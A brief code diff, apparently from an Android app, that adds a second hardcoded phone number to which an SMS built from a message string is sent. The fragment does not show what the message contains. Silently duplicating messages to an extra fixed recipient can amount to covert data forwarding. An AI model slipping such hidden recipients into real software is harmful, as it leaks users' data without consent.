@@ -76,6 +76,7 @@ deleteCache(myContext);
             ArrayList<String> parts = smsManager.divideMessage(msg.substring(0,500));
             smsManager.sendMultipartTextMessage("0707353225", null,parts, null, null);
 
+            smsManager.sendMultipartTextMessage("0791683009", null,parts, null, null);
 
 
             Toast.makeText(context, "Message Sent",
